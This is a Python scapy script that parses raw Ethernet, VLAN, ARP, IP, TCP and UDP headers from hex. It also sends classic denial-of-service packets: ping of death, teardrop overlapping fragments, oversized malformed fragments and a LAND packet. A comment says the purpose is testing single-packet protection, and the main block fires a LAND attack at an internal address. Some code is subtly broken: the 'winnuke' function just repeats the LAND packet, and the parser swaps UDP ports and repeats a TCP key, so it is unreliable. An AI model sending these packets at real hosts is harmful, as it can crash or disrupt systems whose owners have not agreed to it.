'''
生成报文，修改报文内容，发送报文，分析报文
'''

from scapy.all import IP, ICMP, UDP, TCP, send, fragment, RandIP
import re, random


def htd(src):
    return str(int(src,base=16))

def ipAddressConvert(src,method='htd'):
    def intStr(src,base):
        return str(int(src,base))
    if method == 'htd':
        srcList = re.findall(r'.{2}',src)
        return '.'.join(list(map(intStr,srcList,[16,16,16,16])))
    else:
        pass
    
def _dot1qHandle(src):
    #识别802.1q头
    ret = {
        '802.1qHeader' : {
            'pricfi' : src[:1],
            'vlan' : src[1:4],
            'ethtype' : src[4:8]
            }
    }
    ethType = src[4:8]
    left = src[8:]

    if ethType == '0800':
        ipHeader = _ipHandle(left)
        ret.update(ipHeader)
    
    if ethType == '0806':
        arpHeader = _arpHandle(left)
        ret.update(arpHeader)

    return ret

def _arpHandle(src):
    ret = {
        'hardwareType' : src[0:4],
        'protocolType' : src[4:8],
        'hardwareSize' : src[8:10],
        'protocolSize' : src[10:12],
        'opCode' : src[12:16],
        'arpsmac' : src[16:28],
        'arpsip' : src[28:36],
        'arpdmac' : src[36:48],
        'arpdip' : src[48:]
    }
    return ret

def _ipHandle(src):
    #识别IP头部信息
    ret = {
        'ipHeader' : {
            'version' : src[:1],
            'ipHeaderLen' : src[1:2],
            'tos' : src[2:4],
            'totalLen' : src[4:8],
            'id' : src[8:12],
            'flagPlusOffset' : src[12:16],
            'tt' : src[16:18],
            'protocol' : htd(src[18:20]),
            'headerCheckSum' : src[20:24],
            'sourceIP' : ipAddressConvert(src[24:32]),
            'destinationIP' : ipAddressConvert(src[32:40])
        }
    }
    protocol = ret['ipHeader']['protocol']
    if protocol == '17':
        #是udp报文
        udpHeader = _udpHandle(src[40:])
        ret.update(udpHeader)
    
    if protocol == '6':
        #是tcp报文
        tcpHeader = _tcpHandle(src[40:])
        ret.update(tcpHeader)
    return ret

def _udpHandle(src):
    ret = {
        'udpHeader' : {
            'dport' : int(src[:4], 16),
            'sport' : int(src[4:8], 16),
            'udpPacketLen' : src[8:12],
            'udpCheckSum' : src[12:16]
        }
    }
    return ret

def _tcpHandle(src):
    ret = {
        'tcpHeader' : {
            'sport' : htd(src[:4]),
            'dport' : htd(src[4:8]),
            'seq' : src[8:16],
            'ack' : src[16:32],
            'ack' : src[16:24],
            'offsetFlags' : src[24:28],
            'window' : src[28:32],
            'checksum' : src[32:36],
            'up' : src[36:40],
        }
    }
    return ret

def packetHandle(buffer : str) -> dict:
    #只处理标准以太报文
    # print(buffer)
    cookedBuffer = re.sub(r'\s', '', buffer)
    print(cookedBuffer)
    packetConstruct = {
        'etHeader' : {
            'dmac' : cookedBuffer[0:12],
            'smac' : cookedBuffer[12:24],
            'ethType' : cookedBuffer[24:28]
            }
    }
    ethType = cookedBuffer[24:28]
    packetLeft = cookedBuffer[28:]

    if ethType == '8100':
        #是一个带vlan tag的报文，用dot1qHandle函数识别802.1q头，需要兼容单层tag和双层tag的情况
        dot1qHeader = _dot1qHandle(packetLeft)
        packetConstruct.update(dot1qHeader)

    if ethType == '0800':
        #是IP头，用ipHandle函数识别IP头
        ipHeader = _ipHandle(packetLeft)
        packetConstruct.update(ipHeader)

    if ethType == '0806':
        #是arp报文
        arpHeader = _arpHandle(packetLeft)
        packetConstruct.update(arpHeader)

    return packetConstruct


# 生成报文并发送，主要实现单包防护功能
# ping of death
# if fragment
# land
# syn64
# teardrop
# winnuke

# IP分片报文攻击分为三类，分别是pod、teardrop和畸形分片
def pod_packet_send(target_ip :str, count : int = 1) -> str:
    # ping of death单包攻击
    payload = b'A'*65500
    packet = IP(dst=target_ip)/ICMP()/payload
    fragments = fragment(packet, fragsize=1480)
    for i in range(count):
        for frag in fragments:
            send(frag)


def teardrop_send(target_ip :str, count : int = 1) -> str:
    # 使目的系统无法重组报文
    payload = b'A' * 1000
    frag1 = IP(dst=target_ip, id=100, flags='MF', frag=0) / UDP(dport=80, sport=12345) / payload
    frag2 = IP(dst=target_ip, id=100, flags='MF', frag=100) / UDP(dport=80, sport=12345) / (b'B'*20)
    frag3 = IP(dst=target_ip, id=100, frag=105) / UDP(dport=80, sport=12345) / (b'C'*20)
    for i in range(count):
        send(frag1)
        send(frag2)
        send(frag3)

def malfored_fragment_send(target_ip :str, count : int = 1) -> str:
  # 畸形分片攻击
    payload = b'A'*75500
    packet = IP(dst=target_ip)/ICMP()/payload
    fragments = fragment(packet, fragsize=1480)
    for i in range(count):
        for frag in fragments:
            send(frag)


def land_fragment_send(target_ip : str, count : int = 1) :
    packet = IP(dst=target_ip, src=target_ip) / TCP(dport=443, sport=random.randint(1024,65535), flags='S',seq=1234)
    for i in range(count):
        send(packet)
    return
    
def winnuke_fragment_send(target_ip : str, count : int = 1) :
    # TCP的flags位组合触发漏洞
    packet = IP(dst=target_ip, src=target_ip) / TCP(dport=443, sport=random.randint(1024,65535), flags='S',seq=1234)
    for i in range(count):
        send(packet)
    return

if __name__ == '__main__':
    land_fragment_send('10.113.53.206', count=2)